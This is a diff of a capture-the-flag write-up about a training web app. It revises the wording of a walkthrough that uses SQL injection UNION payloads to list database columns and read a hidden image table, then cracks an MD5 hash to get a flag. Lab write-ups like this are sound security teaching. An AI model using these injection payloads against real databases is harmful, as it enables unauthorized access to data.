@@ -6,14 +6,14 @@
 - Let's now use the SQL command to get again the DB structure (the one used to find the 4th flag - Search Member): 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
 - Let's query the 'list_images' table using the different available fields:
 id, URL, title, comment.
-- When I used this SQL query: 1 UNION SELECT title, comment FROM list_images 
+- When we used this SQL query: 1 UNION SELECT title, comment FROM list_images 
 it was possible to notice one image which contains:
 ID: 1 UNION SELECT title, comment FROM list_images 
 Title: If you read this, just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
 Url : Hack me ?
-- I decripted the hash, using the dcode hash website -  https://www.dcode.fr/fonction-hash
+- We decripted the hash, using the dcode hash website -  https://www.dcode.fr/fonction-hash
 => 1928e8083cf461a51303633093573c46 : albatroz
-- Then I aply a Sh256 encryption on the 'albatroz' key and I got this flag:
+- Then we applied a Sh256 encryption on the 'albatroz' key and we got this flag:
 f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
 
 ##Breach Details 
